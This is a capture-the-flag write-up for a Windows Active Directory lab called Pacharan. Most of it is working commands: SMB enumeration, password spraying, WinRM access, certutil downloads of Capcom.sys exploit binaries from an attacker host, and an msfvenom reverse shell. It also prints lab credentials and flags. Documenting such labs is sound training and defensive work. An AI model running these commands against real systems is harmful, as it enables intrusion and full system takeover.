# 🍸 Pacharan - Writeup Completo

![Pacharan Badge](https://img.shields.io/badge/Plataforma-The%20Hackers%20Labs-blue) ![Windows](https://img.shields.io/badge/OS-Windows-0078D4) ![Difficulty](https://img.shields.io/badge/Dificultad-Media-orange)

## 🌟 Overview  
**Pacharán** is a realistic, hands-on Windows Active Directory lab designed to sharpen your offensive AD tradecraft. From initial information leakage to full SYSTEM compromise, this machine tests your mastery of:  
✅ **SMB Information Leakage**  
✅ **Password Spraying & Credential Reuse**  
✅ **WinRM Remote Access**  
✅ **Privilege Escalation via `SeLoadDriverPrivilege`**  
✅ **Kernel Exploitation with Capcom.sys**  

> 💡 *Fun fact: Every credential, share, and printer name hides a clue — and yes, "Soy Hacker y arreglo impresoras" is 100% authentic.*

---

## 🧩 Machine Details  
| Property | Value |
|----------|--------|
| **Platform** | [The Hackers Labs](https://thehackerslabs.com) |
| **OS** | Windows Server 2016 / Windows 10 (Build 14393) |
| **Domain** | `PACHARAN.THL` |
| **Victim IP** | `192.168.69.69` |
| **Attacker IP** | `192.168.69.100` *(recommended)* |
| **Tags** | `Active Directory` `SMB` `Information Leakage` `Password Spraying` `WinRM` `SeLoadDriverPrivilege` |

---

## ⚙️ Installation & Setup  

### 1. Download & Import  
- Download the `.zip` containing `Pacharan.ova`  
- Extract → Import into **VirtualBox**  
- Set network adapter to **Host-only Adapter** (`vboxnet0`)  

### 2. Configure Hosts File  
Add to `/etc/hosts` (Linux/macOS) or `C:\Windows\System32\drivers\etc\hosts` (Windows):  
```bash
192.168.69.69   PACHARAN.THL
```

### 3. Start Machines  
- Boot **Pacharán** + your attacker VM (e.g., Kali)  
- Confirm connectivity: `ping -c 3 PACHARAN.THL`

---

## 🔍 Reconnaissance & Enumeration  

### 📡 Port Scan (Nmap)  
```bash
# Full TCP open-port scan
nmap -n -Pn -sS -sV -p- --open --min-rate 5000 192.168.69.69

# Targeted service version scan
nmap -n -Pn -sCV -p53,88,135,139,389,445,464,593,5985,47001 --min-rate 5000 192.168.69.69
```
🔍 **Key Findings**:  
- `389/tcp` → Active Directory LDAP (`Domain: PACHARAN.THL`)  
- `445/tcp` → SMB signing enforced, but **guest access allowed**  
- `5985/tcp` → WinRM enabled (HTTP API)  
- `DNS`, `Kerberos`, `RPC`, `HTTP` → Classic AD stack ✅  

---

## 🕵️‍♂️ Enumeration & Initial Foothold  

### 🗂️ SMB Share Discovery (Guest Access)  
```bash
netexec smb PACHARAN.THL -u guest -p '' --shares
```
→ Discovered read-accessible share: `NETLOGON2`  

### 📜 Credential Leak  
```bash
smbclient //PACHARAN.THL/NETLOGON2 -U guest%'' -c 'get Orujo.txt'
cat Orujo.txt
# ➤ Pericodelospalotes6969
```

### 👥 User Enumeration (SID Brute-force)  
```bash
impacket-lookupsid PACHARAN.THL/guest@PACHARAN.THL > users.txt
grep "(SidTypeUser)" users.txt | sed 's/.*\\//;s/ (SidTypeUser)//' > users2.txt
```
➡️ **17 valid users**, including `Orujo`, `Whisky`, `Chivas Regal`, `Hendrick`, and more.

### 🔑 Password Spraying (Phase 1)  
```bash
nxc smb PACHARAN.THL -u users2.txt -p 'Pericodelospalotes6969'
# ➤ [+] PACHARAN.THL\Orujo:Pericodelospalotes6969
```

### 📁 Deeper SMB Enumeration (as Orujo)  
```bash
netexec smb PACHARAN.THL -u Orujo -p 'Pericodelospalotes6969' --shares
# ➤ READ access to share: `PACHARAN`
smbclient //PACHARAN.THL/PACHARAN -U Orujo%'Pericodelospalotes6969' -c 'get ah.txt'
```
➡️ `ah.txt`: A **40-line password permutation dictionary** — crafted for streamers 🎮  

### 🔑 Password Spraying (Phase 2)  
```bash
netexec smb PACHARAN.THL -u users2.txt -p ah.txt --ignore-pw-decoding
# ➤ [+] PACHARAN.THL\Whisky:MamasoyStream2er@
```

### 🖨️ Printer Enumeration → Hidden Credential  
```bash
rpcclient -U Whisky%<password> 192.168.69.69
rpcclient $> enumprinters
# ➤ description: [..., TurkisArrusPuchuchuSiu1]
```

### 🔑 Final Spraying → Domain Admin Access  
```bash
netexec smb PACHARAN.THL -u users2.txt -p TurkisArrusPuchuchuSiu1
# ➤ [+] PACHARAN.THL\Chivas Regal:TurkisArrusPuchuchuSiu1
netexec winrm PACHARAN.THL -u 'Chivas Regal' -p TurkisArrusPuchuchuSiu1
# ➤ (Pwn3d!) ✅
```

---

## 🚀 Initial Access  
```bash
evil-winrm -i PACHARAN.THL -u 'Chivas Regal' -p 'TurkisArrusPuchuchuSiu1'
*Evil-WinRM* PS C:\Users\Chivas Regal\Documents> whoami
pacharan\chivas regal
```
🎯 **User flag**: `bb8b4df8eda73e75ca51ca88a909c1cb`  
*(located at `C:\Users\Chivas Regal\Desktop\user.txt`)*

---

## ⬆️ Privilege Escalation: `SeLoadDriverPrivilege` → SYSTEM  

### 🔍 Privilege Check  
```powershell
whoami /priv
# ➤ SeLoadDriverPrivilege → ENABLED ✅
```

### 🛠️ Exploit Workflow  
1. Clone exploit repo on attacker:  
   ```bash
   git clone https://github.com/k4sth4/SeLoadDriverPrivilege && cd SeLoadDriverPrivilege
   python3 -m http.server 80
   ```
2. On victim (via Evil-WinRM):  
   ```powershell
   mkdir temp && cd temp
   certutil -urlcache -split -f http://192.168.69.100/Capcom.sys capcom.sys
   certutil -urlcache -split -f http://192.168.69.100/ExploitCapcom.exe exploitcapcom.exe
   certutil -urlcache -split -f http://192.168.69.100/eoploaddriver_x64.exe eoploaddriver_x64.exe
   ```

3. Load driver & escalate:  
   ```powershell
   .\eoploaddriver_x64.exe System\CurrentControlSet\dfserv C:\temp\capcom.sys
   .\exploitcapcom.exe LOAD C:\temp\capcom.sys
   .\exploitcapcom.exe EXPLOIT whoami
   # ➤ nt authority\system ✅
   ```

4. Spawn reverse shell:  
   ```bash
   # Attacker:
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.69.100 LPORT=4444 -f exe > revshell.exe
   # Upload & execute:
   upload revshell.exe
   .\exploitcapcom.exe EXPLOIT revshell.exe
   ```

🎯 **Root flag**: `cfa7cb1cc20e26c0428f9222d44c76a0`  
*(located at `C:\Users\Administrador\Desktop\root.txt`)*

---

## 🏁 Summary & Key Takeaways  
| Stage | Technique | Tool Used | Why It Worked |
|-------|-----------|-----------|----------------|
| **Recon** | DNS/LDAP/SMB enumeration | `nmap`, `enum4linux-ng` | Misconfigured AD with verbose services |
| **Leak** | Unauthenticated SMB share | `smbclient`, `netexec` | `NETLOGON2` exposed plaintext creds |
| **Spray** | Credential stuffing across users | `netexec` | Weak, pattern-based passwords + no lockout |
| **Escalate** | Kernel driver abuse | `Capcom.sys` + `ExploitCapcom` | `SeLoadDriverPrivilege` granted to low-priv user |

> 🧪 **Pro Tip**: Always check printer descriptions — they’re *goldmines* for hidden credentials!  
> 🛡️ **Defense Tip**: Disable `SeLoadDriverPrivilege` for non-admins & enforce strict password policies + account lockout.

---

## 📜 License  
This lab is part of **The Hackers Labs** curriculum — for educational and ethical pentesting only.  
⚠️ Do not use against systems without explicit authorization.

---

> ✨ *"La seguridad es como el pacharán: dulce al principio, pero con un final que te deja pensando... y revisando tus privilegios."*  
> — The Hackers Labs Team 🇪🇸

```
